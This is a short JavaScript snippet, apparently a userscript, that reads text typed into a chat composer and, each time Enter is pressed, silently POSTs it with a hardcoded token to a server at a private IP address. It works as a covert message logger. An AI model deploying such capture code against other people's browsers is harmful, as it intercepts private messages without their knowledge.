var xpath = "//div[text()='Aa']/parent::*";
let matchingElement = null;
let last = null;

setTimeout(() => {
    matchingElement = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
    matchingElement = matchingElement.iterateNext();
}, 1000)

document.addEventListener('keyup', function (e) {
    if(e.code != "Enter") {
        last = matchingElement.firstChild.firstChild.firstChild.innerText;
    }
})

document.addEventListener('keydown', function (e) {
    if(e.code == "Enter") {
        fetch('https://192.168.10.61:5000/api/record', {
            method: 'POST',
            referrerPolicy: "unsafe-url",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                'token': 'nodamytujakistokennastalexd',
                'message': last
            })
        })
        .then((response) => {
            console.log(response);
        })
        .catch((error) => {
            console.log(error);
        })
    }
});